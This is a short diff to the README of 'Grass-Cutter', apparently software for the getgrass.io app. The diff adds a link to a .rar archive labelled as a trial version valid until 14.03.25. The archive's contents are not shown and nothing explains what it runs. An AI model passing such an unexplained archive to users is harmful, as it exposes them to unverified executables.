@@ -1,6 +1,8 @@
 # 🌅 GRASS
 Software for https://app.getgrass.io/ 
 
+TRIAL VERSION VALID TILL 14.03.25: https://github.com/qt333/Grass-Cutter/blob/main/Grass_.rar
+
 <div align="center">
   <img src="https://i.ibb.co/GfCgJb6y/GRASS-CUTTER.jpg" alt="GRASS-CUTTER">
   <p align="center">
